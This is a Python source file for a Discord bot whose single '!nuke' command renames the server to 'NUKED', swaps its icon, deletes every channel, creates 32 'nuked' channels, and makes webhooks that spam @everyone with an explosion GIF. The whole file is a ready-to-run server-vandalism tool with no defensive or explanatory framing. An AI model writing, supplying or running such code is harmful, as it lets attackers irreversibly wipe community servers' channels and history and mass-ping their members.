import discord
from discord.ext import commands
import requests

intents = discord.Intents.default()
intents.message_content = True  # Enable message content reading

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

def get_token():
    with open('token.txt', 'r') as file:
        return file.read().strip()

def download_image(url):
    response = requests.get(url)
    return response.content

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    # Get the server
    server = ctx.guild

    # Change the server name and profile picture
    try:
        image_url = "https://i.imgur.com/gOEUqG7.png"
        icon_bytes = download_image(image_url)
        await server.edit(name="NUKED", icon=icon_bytes)
    except discord.Forbidden:
        await ctx.send("Error changing the server name or profile picture.")
        return

    # Get all channels in the server
    all_channels = server.channels

    # Delete all channels
    for channel in all_channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"Cannot delete {channel.name}. Missing permission or insufficient role.")

    try:
        for _ in range(32):
            await server.create_text_channel("nuked")
    except discord.Forbidden:
        await ctx.send("Error creating channels.")

    all_channels = server.channels

    try:
        for channel in all_channels:
            webhook = await channel.create_webhook(name="NUKED")
            await webhook.send("@everyone NUKED https://tenor.com/view/explosion-explode-nuclear-bomb-mushroom-cloud-gif-7885327")
    except discord.Forbidden:
        await ctx.send("Error sending spam messages with webhooks.")

bot.run(get_token())
